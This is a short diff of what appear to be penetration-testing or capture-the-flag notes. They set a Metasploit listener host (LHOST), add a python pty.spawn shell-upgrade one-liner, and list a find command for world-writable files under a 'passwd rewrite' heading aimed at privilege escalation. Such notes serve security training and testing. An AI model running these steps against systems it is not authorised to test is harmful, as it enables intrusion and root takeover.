@@ -14,6 +14,7 @@ set LHOST 192.60.22.2
 exploit **
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
 
 ** passwd rewrite **
 find / -not -type l -perm -o+w
